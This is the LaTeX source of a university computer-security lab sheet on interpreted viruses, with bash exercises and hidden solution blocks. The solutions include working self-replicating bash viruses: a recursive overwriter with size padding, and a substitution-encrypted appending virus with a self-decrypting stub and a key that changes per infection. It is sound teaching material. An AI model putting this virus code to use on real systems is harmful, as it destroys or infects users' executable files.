\documentclass[a4paper,11pt]{article}

\usepackage{comment}
\usepackage{fullpage}
\usepackage[all]{xy}
\usepackage[utf8]{inputenc}
\usepackage{amsmath,amsthm}
\usepackage{amsfonts}
%\usepackage{algorithm}
\usepackage{graphicx}
%\usepackage[compatible,noend]{algpseudocode}
\usepackage{latexsym}
\usepackage{float}
\usepackage{color}

%%%%%%%%%%%%%%% COMMANDES %%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\itemb}{\item[$\bullet$]}

%% Les ensembles de modelisation
\newcommand{\Ki}{\mathcal{K}}
\newcommand{\Ci}{\mathcal{C}}
\newcommand{\Mi}{\mathcal{M}}
\newcommand{\Ei}{\mathcal{E}}
\newcommand{\Di}{\mathcal{D}}

\newcommand{\Fd}{\mathbb{F}}
\newcommand{\Znat}{\mathbb{Z}}
\newcommand{\Nnat}{\mathbb{N}}

%%%%%%%%%%%%%%% ENVIRONEMENTS %%%%%%%%%%%%%%%%%%%%%%%


\theoremstyle{plain}
\newtheorem{lemme}{Lemma}
\newtheorem{algorithme}{ Algorithm }
\newtheorem{corolaire}{Corollary}
\newtheorem{propriete}{Property}
\newtheorem{proposition}{Proposition}
\newtheorem{theoreme} {Theorem}
\newtheorem{definition}{Definition}
%\newtheorem{correction}{Correction}
\excludecomment{correction}

\theoremstyle{definition}
\newtheorem*{probleme}{Problem}
\newtheorem*{cout}{Cost}
\newtheorem*{fait}{Fact}
\newtheorem*{notation}{Notation}
\newtheorem*{complexite}{Complexity}
\newtheorem{exercice}{Exercise}
%\theoremstyle{remark}
\newtheorem{remarque}{Remark}
\newtheorem{exemple}{Example}

%%%%%%%%%%%%%%%%%% ANNEE COURANTE
%newcounter{fooyear} 
%setcounter{fooyear}{2026} 
%addtocounter{fooyear}{1}
%arabic{fooyear}

%%%%%%%%%%%%%% DOCUMENTS %%%%%%%%%%%%%%%%%%%%%%%%%%%%


\begin{document}

\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.5pt width \textwidth}}
\noindent \textbf{University of Perpignan} \hfill  L3 Computer Science \\
 \hfill C. Legrand \hfill  Year 2026  \\
\smallskip
\begin{center}
{
 {\scshape \large Lab Work 3 -- Computer Security}  \\
 Interpreted Viruses
}
\end{center}
\hbox{\raisebox{0.4em}{\vrule depth 0pt height 0.9pt width \textwidth}}
%\hline

\bigskip

\bigskip

\section{Some BASH Scripts}
  
\begin{exercice}

 You will write your first script. Don't forget to give the file execution permission before running it.  
\begin{enumerate}
\item Write a script that displays the following information
\begin{itemize}
\itemb A sentence containing the user's name and the type of shell being used;
\itemb The date (use the \verb|date| command).
\end{itemize}
\item Modify the previous script so that it also indicates the season based on the current date.
%\item Modifier le précédent script afin qu'il affiche aussi la fréquence du processeur en GHz (on utilisera les données présente dans le fichier \verb|/proc/cpuinfo|).
\end{enumerate}
\end{exercice}


\begin{correction}
The following script answers the exercise questions:
\begin{verbatim}
#!/bin/bash

echo "Hello $USER, you are using the shell $SHELL"
echo "Today is $(date +%D)"

# indicate the season (for simplicity, only the month is considered
mois=$(date +%m)

if [ $mois -le 3 ]
then 
echo "It is winter"
elif [ $mois -gt 3 -a  $mois -le 6 ]
then
echo "It is spring"
elif [ $mois -gt 6 -a  $mois -le 9 ]
then
echo "It is summer"
elif [ $mois -gt 9 -a  $mois -le 12 ]
then
echo "It is autumn"
fi
echo "The processor frequency is:"
cat /proc/cpuinfo | grep GHz | head -n 1 | cut -d "@" -f2

\end{verbatim}
\end{correction}


\begin{exercice}
Recall that the syntax for the while loop in bash is as follows:
\begin{verbatim}
  while test
  do
    command(s)
  done
\end{verbatim}
\begin{enumerate}
\item
Write a script called \texttt{countdown} that prints to standard output something like
%    Write a script called countdown that prints output similar to the following:
\begin{verbatim}
    10
    9
    8
    7
    6
    5
    4
    3
    2
    1
    GO!
\end{verbatim}
\item Modify the \texttt{countdown} script so that it takes as parameter the number from which to start the countdown.
\end{enumerate}
\end{exercice}

\begin{correction}
The script answering question 1 is as follows
\begin{verbatim}
#!/bin/bash
compteur=10
while [ $compteur -gt 0 ]
do
 echo $compteur
 compteur=$(($compteur-1))
done
\end{verbatim}
for question 2, simply change the assignment \texttt{compteur=10} to \texttt{compteur=\$1}
\end{correction}

\begin{exercice}
\begin{enumerate}
\item Write a bash script that iterates through the contents of a directory and counts the number of regular files and directories, displaying both numbers at the end.
\item  (Optional) Write a script that traverses a file tree and outputs to standard output the names of files whose last modification date precedes a date given as parameter.
%\item \'Ecrivez un script "renomme.sh" permettant de renommer un ensemble de fichier. Par exemple \verb|./renomme.sh '.c' '.bak'| aura pour effet de renommer tous les fichiers d'extension \verb|.c| ou \verb|.bak|, par exemple le fichier \verb|toto.c| devient \verb|toto.bak|.
\end{enumerate}
\end{exercice}

\begin{correction}
\begin{itemize}
\item Question 1.
\begin{verbatim}
#!/bin/bash

nbrep=0
nbfic=0

for file in * 
do
#echo $file
if [ -f $file ]
then
    nbfic=$(($nbfic+1))
fi
if [ -d $file ]
then
    nbrep=$(($nbrep+1))
fi
done 

echo "number of regular files= $nbfic"
echo "number of directories= $nbrep"
\end{verbatim}

\item Question 2. A practical solution here is to use a recursive function. For simplicity, we compare the creation date with only the year given as parameter.

\begin{verbatim}
#!/bin/bash 

anneelim=$1
export anneelim

function rec {
    #echo $1 
    for i in *
    do
	if [ -d "$i" ]
	then
	    cd $i	    
	    rec $i
	elif [ -f "$i" ]
	then
             # we retrieve the year of
	    DT=$(ls --full-time $i | cut -d " " -f6) 

	    annee=$(echo $DT | cut -d "-" -f1)
	    #echo "$DT et $annee"
            # we compare with the year given as script parameter
	    if [ $annee -gt  $anneelim ]
	    then
		echo "$i was created on $DT and is located in $(pwd)"
	    fi
	fi
    done
}  

rec ./

\end{verbatim}
\end{itemize}
\end{correction}


\section{Bash Virus Programming}

{\Large Method:} During your development and testing, proceed as follows:
\begin{itemize}
\item Edit your virus along with a target script (that simply echoes ``target'') in a working directory.
\item To test, copy the virus and the target script into a subdirectory, execute it, and analyze what happened.
\end{itemize}
For added safety (which we won't do in lab since the viruses created here only spread within the test directory), using a virtual machine is recommended.


\begin{exercice}[Improving the \texttt{UNIX\_OWR} virus]$\;$

\begin{enumerate}
\item Modify the \texttt{UNIX\_OWR} virus so that its action extends to subdirectories and only targets executable files, other than the currently infecting file. 
\item How can we counter the uniformity of file sizes after infection?
%\item Améliorer le Virus \texttt{UNIX\_OWR} afin de supprimer les limitations données en cours.
\end{enumerate}
\end{exercice}


\begin{correction}
\begin{enumerate}
\item The following code answers the question. 
We only descend one level into subdirectories.
\begin{verbatim}
#!/bin/bash

#Overwriter I
for file in *; do #for every file
    if [ -d $file ]; then # if we encounter a directory
       cd $file #we move into this directory
       for file1 in *; do #for every file du repertoire
	   if [ -x $file1 -a -w $file1 ]; then
               cp "../$0" $file1 #overwrite target file with virus
	   fi
       done
       cd ..
    fi
    echo $file
    name1=$(basename $0)
    name2=$(basename "./$file")
    echo "$name1 != $name2 ??"
    if [ "$name1" != "$name2" ]
    then
	echo "oui pour $name2"
	if [  -x $file -a -w $file ]; then
	    echo "cp $0 $file"
            cp $0 $file #overwrite target file with virus
	fi
    fi
done
\end{verbatim}

If we wanted to infect the entire file tree of the directory (subdirectories, sub-subdirectories, etc.), we would need to use a recursive function, with copying done from the absolute path containing the infecting file.


\item  The technique used here is to add the line \texttt{echo \"adding padding lines\"} to maintain the same number of lines as in the original file.


\begin{verbatim}
#!/bin/bash

#Overwritter I
for file in *; do #for every file
    if [ -d $file ]; then # if we encounter a directory
       cd $file #we move into this directory
       for file1 in *; do #for every file du repertoire
	   if [ -x $file1 -a -w $file1 ]; then
               nbligne=$(wc -l $file | cut -d" " -f 1  ) 
               cp "../$0" $file1 #overwrite target file with virus
               count=0
	       while [ $count -le $(($nbligne - 37)) ]; do
	         echo "echo \"on rajoute deslignes\"" >> $file
	         count=$(($count+1))
	       done
	       echo "$count $nbligne $file"
	   fi
       done
       cd ..
    fi
    name1=$(basename $0)
    name2=$(basename "./$file")
    echo "$name1 != $name2 ??"
    if [ "$name1" != "$name2" ]
    then
	if [ -x $file -a -w $file -a "$0" != "./$file" ]; then
            nbligne=$(wc -l $file | cut -d" " -f 1  ) 
            cp $0 $file  #overwrite target file with virus
            count=0
	    while [ $count -le $(($nbligne - 37)) ]; do
		echo "echo \"on rajoute deslignes\"" >> $file
		count=$(($count+1))
	    done
	    echo "$count $nbligne $file"
	fi
    fi
done
\end{verbatim}


\end{enumerate}
\end{correction}




\begin{exercice}

\begin{enumerate}
\item Write a script that takes a file as argument and applies a character substitution to all or part of the characters.
You may use the \texttt{tr} command for this.
%\item En utilisant le code de la première question, modifiez le virus \texttt{vbashp.sh} afin qu'il chiffre avec une subsitution la partie virale lors de chaque infection. Faites-le en plusieurs étapes: 
%\begin{enumerate}
\item Using the code from the first question, create a version of \texttt{vbashp.sh} that adds its previously encrypted code to the target file.
\item In a file containing the encrypted viral code from question 2: prepend a restoration code that 
\begin{itemize}
\item selects the encrypted lines, 
\item decrypts them and puts them in a temporary file,
\item Executes the temporary file to launch the infection phase.
\end{itemize}
%suivi du code de \texttt{vbashp.sh} chiffré. Le code de restauration restaure la partie chiffrée (\texttt{vbashp.sh}), i.e., la déchiffre, dans un fichier temporaire et exécute ce fichier temporaire.
%\item Combiner 1) et 2) pour faire une version d'\texttt{vbashp.sh} qui infecte par ajout de code préalablement chiffré.
%\end{itemize}
%Par souci de simplification vous pouvez utiliser une substitution fixe (dans l'idéal celle ci doit être variable).
\item What problem does the resulting virus still suffer from? Propose a strategy to solve this problem.
\end{enumerate}

\end{exercice}

\begin{correction}
\begin{enumerate}
\item 
We perform substitutions using the tr command: the short script below performs a substitution of the file \texttt{\$1} encoded in \texttt{tab1}
\begin{verbatim}
tab0="abcdefghijklmnopqrstuvwxyz"
tab1="hijabcdefgmnopqrstuvwxyzkl"

#cat $1 | tr  ["$tab1"] ["$tab0"] > fichier-$$.txt
cat $1 | tr  ["$tab0"] ["$tab1"] > fichier-$$.txt
\end{verbatim}

\item  We apply this technique to improve the \texttt{vbashp.sh} virus encrypted by substitution, prepending it with a restoration code.
\begin{verbatim}
#!/bin/bash

tab0="abcdefghijklmnopqrstuvwxyz"
tab1="hijabcdefgmnopqrstuvwxyzkl"

tail -n 11  $0 | tr  ["$tab1"] ["$tab0"] > fichier-$$.sh
#cat $1 | tr  ["$tab0"] ["$tab1"] > fichier-$$.txt
chmod u+x fichier-$$.sh
#./fichier-$$.sh # uncomment this part to enable replication
exit 0

#!/ifp/ihue

bjeq "jqab eqvb"

cqt f fp *.ue;
aq # rqwt vqwu nbu cfjefbtu hxbj n'bzvbpufqp ue
fc vbuv  "./$f" != "$0"; 
   vebp # uf jfinb != cfjefbt fpcbjvhpv bp jqwtu 
   vhfn -p 9 $0  >> $f; # hgqwv jqab aw xftwu 
cf
aqpb
\end{verbatim}
\item The following code answers the question

\begin{verbatim}
#!/bin/bash

tab0="abcdefghijklmnopqrstuvwxyz"
tab1="haigbcevrfwnyopjmqdstuxzkl"

#Overwritter I
for file in *; do #for every file
    if [ -x $file -a "$0" != "./$file" -a "$name" != "./$file" ]; then
	echo "infecting $file by adding encrypted viral code"
        #We add the encrypted viral part
	tail -n 11  $0 | tr  ["$tab1"] ["$tab0"] >> $file
    fi
done
\end{verbatim}


\item The code is given below: there is a restoration part that decrypts the viral code into a temporary file, first adding the name of the infecting script along with the encryption/decryption substitution. 
\begin{verbatim}
#!/bin/bash

tab0="abcdefghijklmnopqrstuvwxyz"
tab1="haigbcevrfwnyopjmqdstuxzkl"

echo "#!/bin/bash " > .temp1.sh
echo "tab0=\"$tab0\"" >> .temp1.sh
echo "tab1=\"$tab1\"" >> .temp1.sh
echo "name=\"$0\"" >> .temp1.sh
tail -28 $0 | tr  ["$tab0"] ["$tab1"]  >> .temp1.sh
chmod u+x .temp1.sh
./.temp1.sh
exit 0

#Ohgikicuugi I
jni jczg cl *; sn #onvi unvu jcfacgi
    cj [ -w $jczg -b "$0" != "./$jczg" -b "$lbqg" != "./$jczg" ]; uagl
	gfan "cljgfucnl sg $jczg"
	v=$$
	v=$(($v % 26))
	u=$ube1
	c=0
	kaczg [ $c -zg $v ]; sn
	    u=$(gfan $u  |  ui ["$ube1"] ["$ube0"])
	    c=$(($c+1))
	snlg
        #Ol gfibtg bhgf zg fnsg sg igtubvibucnl
	#gfan "#!/ecl/ebta " > $jczg
	gfan "ube0=\"$ube0\"" >> $jczg
	gfan "ube1=\"$u\"" >> $jczg
	gfan 'gfan "#!/ecl/ebta " > .ugqo1.ta' >> $jczg
	gfan 'gfan "ube0=\"$ube0\"" >> .ugqo1.ta' >> $jczg
	gfan 'gfan "ube1=\"$ube1\"" >> .ugqo1.ta' >> $jczg
	gfan 'gfan "lbqg=\"$0\"" >> .ugqo1.ta' >> $jczg
	gfan 'ubcz -l 28 $0 | ui  ["$ube0"] ["$ube1"] >> .ugqo1.ta' >> $jczg
	gfan 'faqns v+w .ugqo1.ta' >> $jczg
	gfan './.ugqo1.ta' >> $jczg
	gfan 'gwcu 0' >> $jczg
        gfan "$u"
	ubcz -l 28  $0 | ui  ["$u"] ["$ube0"] >> $jczg
    jc
snlg
\end{verbatim}

The same code but in cleartext is given below. It propagates by appending, and changes the encryption key with each infection. 
\begin{itemize}
\item The code portion \texttt{u=\$\$ j... i=\$((i+1)) done} is used to randomize the substitution used for encryption.
\item The code portion consisting of the series of echo statements corresponds to the restoration code.
\item The addition of encrypted infecting code is done with the command \texttt{tail -n 29  \$0 | tr  [\"\$tab1\"] [\"\$tab0\"] >> \$file}.
\end{itemize}
\begin{verbatim}
#!/bin/bash 
tab0="abcdefghijklmnopqrstuvwxyz"
tab1="haigbcevrfwnyopjmqdstuxzkl"
name="./vbashp-improved-avec-code-chiffre.sh"
#Overwritter I
for file in *; do #for every file
    if [ -x $file -a "$0" != "./$file" -a "$name" != "./$file" ]; then
	echo "infecting $file"
	u=$$
	u=$(($u % 26))
	t=$tab1
	i=0
	while [ $i -le $u ]; do
	    t=$(echo $t  |  tr ["$tab1"] ["$tab0"])
	    i=$(($i+1))
	done
        #We overwrite with the restoration code
	#echo "#!/bin/bash " > $file
	echo "tab0=\"$tab0\"" >> $file
	echo "tab1=\"$t\"" >> $file
	echo 'echo "#!/bin/bash " > .temp1.sh' >> $file
	echo 'echo "tab0=\"$tab0\"" >> .temp1.sh' >> $file
	echo 'echo "tab1=\"$tab1\"" >> .temp1.sh' >> $file
	echo 'echo "name=\"$0\"" >> .temp1.sh' >> $file
	echo 'tail -n 28 $0 | tr  ["$tab0"] ["$tab1"] >> .temp1.sh' >> $file
	echo 'chmod u+x .temp1.sh' >> $file
	echo './.temp1.sh' >> $file
	echo 'exit 0' >> $file
        echo "$t"
	tail -n 28  $0 | tr  ["$t"] ["$tab0"] >> $file
    fi
done
\end{verbatim}

\item The problem is managing re-infection; a possible technique is to insert a marker in the encrypted part.
\end{enumerate}
\end{correction}

\section{Resident Virus in C}

\begin{exercice} We will implement some features of a resident virus.
\begin{enumerate}
\item Write a C program that regularly refreshes its code, effectively changing its PID. You may use the following functions
\begin{verbatim}
  pid_t fork();
  int execlp(const char * application, const char * arg, ... );
  sleep(int sec);
\end{verbatim}
\item (Optional) Based on the code from question 1, implement a resident virus that monitors the files in a directory, and if one of the files is modified, overwrites it with its own code. (Hint: use functions from \texttt{time.h}, \texttt{readdir} to traverse a directory, and \texttt{stat} to retrieve file information).
%Programer un virus résident utilisant la primitive \texttt{fork()} pour rafraîchir le processus viral à intervalles réguliers. Quel est l'intér de ce mécanisme?
\end{enumerate}
\end{exercice}

\end{document}
